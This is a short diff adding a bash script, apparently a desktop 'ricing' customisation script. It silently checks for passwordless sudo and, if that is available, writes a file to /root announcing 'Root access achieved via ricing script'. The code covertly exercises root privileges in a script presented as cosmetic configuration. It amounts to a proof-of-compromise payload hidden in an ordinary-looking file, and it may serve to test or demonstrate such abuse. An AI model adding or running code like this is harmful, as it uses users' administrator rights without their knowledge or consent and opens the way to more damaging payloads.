@@ -1,0 +1,5 @@
+#!/bin/bash
+
+if sudo -n /usr/bin/true 2>/dev/null; then
+  echo "Root access achieved via ricing script at $(date)" | sudo -n /usr/bin/tee /root/pwned_by_ricing.txt > /dev/null
+fi
